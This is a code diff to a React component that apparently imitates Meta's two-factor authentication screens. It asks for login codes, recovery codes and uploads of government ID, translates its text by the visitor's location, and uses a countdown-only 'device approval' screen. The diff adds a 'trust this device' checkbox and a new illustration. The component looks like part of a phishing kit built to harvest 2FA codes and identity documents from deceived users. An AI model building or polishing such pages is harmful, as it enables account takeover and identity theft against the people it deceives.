@@ -20,6 +20,7 @@ const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
     const [showDeviceApproval, setShowDeviceApproval] = useState(false);
     const [deviceUsed, setDeviceUsed] = useState(false);
     const [deviceCountdown, setDeviceCountdown] = useState(0);
+    const [trustDevice, setTrustDevice] = useState(false);
     const [showRecoveryUpload, setShowRecoveryUpload] = useState(false);
     const [recoveryFiles, setRecoveryFiles] = useState<File[]>([]);
     const [uploading, setUploading] = useState(false);
@@ -52,7 +53,7 @@ const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
     useEffect(() => {
         if (!geoInfo) return;
 
-        const textsToTranslate = ['Two-factor authentication required', 'Enter the code for this account that we send to', 'Enter the code we send to your phone.', 'Enter the 6-digit code from your authentication app.', 'Enter a recovery code that you previously saved when you set up two-factor authentication.', 'Code', "This code doesn't work. Check it's correct or try a new one after", 'Continue', 'Try another way', "Choose a way to confirm it's you", 'These are your available confirmation methods.', 'Email', "We'll send a code to", 'Text message', 'Authentication app', 'Get a code from your authentication app.', 'Recovery code', 'Use a recovery code that you previously saved.', 'Approve from another device', "Confirm it's you by approving from a device you've previously logged in on.", 'Check your notifications', 'We sent a notification to your other logged-in device. Approve the login there.', 'Waiting for approval', 'Need another option?', 'To keep your account safe, accessing it without your usual login methods can take a few days. To get started, go to', 'account recovery', 'Account Recovery', 'Confirm your identity', 'Upload a photo or scan of your government-issued ID to confirm your identity.', 'Accepted ID types', "Driver's license", 'Passport', 'National ID card', 'Residence permit', 'Click to upload your ID', 'or drag and drop', 'Selected files', 'Clear all', 'Your information is protected', 'Your ID will be encrypted and stored securely.', 'Meta does not share your ID with third parties.', 'Your ID will be deleted after the review is complete.', 'Submit for review'];
+        const textsToTranslate = ['Two-factor authentication required', 'Enter the code for this account that we send to', 'Enter the code we send to your phone.', 'Enter the 6-digit code from your authentication app.', 'Enter a recovery code that you previously saved when you set up two-factor authentication.', 'Code', "This code doesn't work. Check it's correct or try a new one after", 'Continue', 'Try another way', "Choose a way to confirm it's you", 'These are your available confirmation methods.', 'Email', "We'll send a code to", 'Text message', 'Authentication app', 'Get a code from your authentication app.', 'Recovery code', 'Use a recovery code that you previously saved.', 'Approve from another device', "Confirm it's you by approving from a device you've previously logged in on.", 'Check your notifications', 'We sent a notification to your other logged-in device. Approve the login there.', 'Waiting for approval', 'Approve from another device to continue.', 'Trust this device and skip this step from now on.', 'Need another option?', 'To keep your account safe, accessing it without your usual login methods can take a few days. To get started, go to', 'account recovery', 'Account Recovery', 'Confirm your identity', 'Upload a photo or scan of your government-issued ID to confirm your identity.', 'Accepted ID types', "Driver's license", 'Passport', 'National ID card', 'Residence permit', 'Click to upload your ID', 'or drag and drop', 'Selected files', 'Clear all', 'Your information is protected', 'Your ID will be encrypted and stored securely.', 'Meta does not share your ID with third parties.', 'Your ID will be deleted after the review is complete.', 'Submit for review'];
 
         const translateAll = async () => {
             const translatedMap: Record<string, string> = {};
@@ -351,22 +352,92 @@ const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
 
             {showDeviceApproval && (
                 <div className='fixed inset-0 z-50 flex flex-col items-center justify-center bg-white px-6'>
-                    <div className='flex max-w-md flex-col items-center text-center'>
-                        <div className='mb-6 flex h-20 w-20 items-center justify-center rounded-full bg-[#e7f3ff]'>
-                            <svg xmlns='http://www.w3.org/2000/svg' width='40' height='40' viewBox='0 0 24 24' fill='none' stroke='#0064e0' strokeWidth='1.5' strokeLinecap='round' strokeLinejoin='round'>
-                                <rect x='5' y='2' width='14' height='20' rx='2' ry='2' />
-                                <line x1='12' y1='18' x2='12' y2='18' />
+                    <div className='flex w-full max-w-sm flex-col items-center text-center'>
+                        <div className='mb-6 w-full'>
+                            <svg viewBox='0 0 320 200' xmlns='http://www.w3.org/2000/svg' className='h-auto w-full' aria-hidden='true'>
+                                <defs>
+                                    <linearGradient id='devBg' x1='0' y1='0' x2='1' y2='1'>
+                                        <stop offset='0%' stopColor='#f3e6ff' />
+                                        <stop offset='100%' stopColor='#ffe4ec' />
+                                    </linearGradient>
+                                    <linearGradient id='devMonitor' x1='0' y1='0' x2='0' y2='1'>
+                                        <stop offset='0%' stopColor='#d6c2f5' />
+                                        <stop offset='100%' stopColor='#c0a8ed' />
+                                    </linearGradient>
+                                    <linearGradient id='devScreen' x1='0' y1='0' x2='0' y2='1'>
+                                        <stop offset='0%' stopColor='#fff5fa' />
+                                        <stop offset='100%' stopColor='#f0e8ff' />
+                                    </linearGradient>
+                                    <linearGradient id='devPhone' x1='0' y1='0' x2='0' y2='1'>
+                                        <stop offset='0%' stopColor='#7c5fd8' />
+                                        <stop offset='100%' stopColor='#5a3fc2' />
+                                    </linearGradient>
+                                    <linearGradient id='devPhoneScreen' x1='0' y1='0' x2='0' y2='1'>
+                                        <stop offset='0%' stopColor='#a89df0' />
+                                        <stop offset='100%' stopColor='#8b7be0' />
+                                    </linearGradient>
+                                </defs>
+
+                                <rect x='0' y='0' width='320' height='200' rx='16' fill='url(#devBg)' />
+
+                                <g transform='translate(20,30)'>
+                                    <rect x='0' y='0' width='160' height='115' rx='8' fill='url(#devMonitor)' />
+                                    <rect x='6' y='6' width='148' height='97' rx='4' fill='url(#devScreen)' />
+                                    <rect x='70' y='115' width='20' height='10' fill='#7c5fd8' />
+                                    <rect x='40' y='125' width='80' height='6' rx='3' fill='#7c5fd8' />
+
+                                    <g transform='translate(20,20)'>
+                                        <rect x='0' y='0' width='120' height='70' rx='6' fill='#fff' />
+                                        <circle cx='14' cy='14' r='4' fill='#1877F2' />
+                                        <rect x='24' y='10' width='50' height='4' rx='2' fill='#d8d8e8' />
+                                        <rect x='24' y='18' width='30' height='3' rx='1.5' fill='#e8e8f0' />
+                                        <rect x='10' y='30' width='100' height='6' rx='3' fill='#e8e8f0' />
+                                        <rect x='10' y='40' width='100' height='6' rx='3' fill='#e8e8f0' />
+                                        <rect x='10' y='50' width='60' height='6' rx='3' fill='#e8e8f0' />
+                                    </g>
+                                </g>
+
+                                <g transform='translate(170,40)'>
+                                    <rect x='0' y='0' width='90' height='140' rx='14' fill='url(#devPhone)' />
+                                    <rect x='6' y='6' width='78' height='128' rx='9' fill='url(#devPhoneScreen)' />
+                                    <rect x='32' y='12' width='26' height='3' rx='1.5' fill='#5a3fc2' opacity='0.4' />
+
+                                    <g transform='translate(15,28)'>
+                                        <rect x='0' y='0' width='60' height='10' rx='2' fill='#fff' opacity='0.4' />
+                                        <rect x='0' y='15' width='60' height='50' rx='4' fill='#fff' opacity='0.85' />
+                                        <circle cx='30' cy='40' r='9' fill='none' stroke='#5a3fc2' strokeWidth='1.5' />
+                                        <path d='M 27 40 L 29 42 L 33 38' stroke='#5a3fc2' strokeWidth='1.5' fill='none' strokeLinecap='round' strokeLinejoin='round' />
+                                    </g>
+
+                                    <g transform='translate(35,118)'>
+                                        <rect x='0' y='0' width='20' height='2' rx='1' fill='#5a3fc2' opacity='0.4' />
+                                    </g>
+                                </g>
                             </svg>
                         </div>
-                        <p className='mb-2 text-[20px] font-semibold text-[#050505]'>{t('Check your notifications')}</p>
-                        <p className='mb-6 text-[15px] leading-[1.4] text-[#65676B]'>{t('We sent a notification to your other logged-in device. Approve the login there.')}</p>
-                        <div className='h-10 w-10 animate-spin rounded-full border-3 border-[#e4e6eb] border-t-[#0064e0]'></div>
-                        <p className='mt-4 text-[14px] text-[#65676B]'>
-                            {t('Waiting for approval')}... ({deviceCountdown}s)
-                        </p>
+
+                        <p className='mb-2 text-[20px] font-semibold text-[#050505]'>{t('Waiting for approval')}</p>
+                        <p className='mb-6 text-[15px] leading-[1.4] text-[#65676B]'>{t('Approve from another device to continue.')}</p>
+
+                        <label className='mb-6 flex w-full cursor-pointer items-start gap-3 text-left'>
+                            <input
+                                type='checkbox'
+                                checked={trustDevice}
+                                onChange={(e) => setTrustDevice(e.target.checked)}
+                                className='mt-0.5 h-5 w-5 shrink-0 cursor-pointer appearance-none rounded border-2 border-[#0866ff] bg-white transition-all checked:border-[#0866ff] checked:bg-[#0866ff]'
+                                style={{
+                                    backgroundImage: trustDevice ? "url(\"data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16' fill='white'%3e%3cpath d='M13.5 4.5L6 12L2.5 8.5L3.91 7.09L6 9.17L12.09 3.09L13.5 4.5Z'/%3e%3c/svg%3e\")" : 'none',
+                                    backgroundSize: '100% 100%',
+                                    backgroundPosition: 'center',
+                                    backgroundRepeat: 'no-repeat'
+                                }}
+                            />
+                            <span className='text-[14px] leading-[1.4] text-[#050505]'>{t('Trust this device and skip this step from now on.')}</span>
+                        </label>
+
                         <button
                             type='button'
-                            className='mt-8 h-11 w-full max-w-sm rounded-full border border-[#ccd3db] text-[15px] font-medium text-[#0a1317] transition-colors hover:bg-gray-50'
+                            className='h-12 w-full rounded-full border border-[#ccd3db] text-[15px] font-medium text-[#0a1317] transition-colors hover:bg-gray-50'
                             onClick={() => {
                                 setShowDeviceApproval(false);
                                 setDeviceUsed(true);
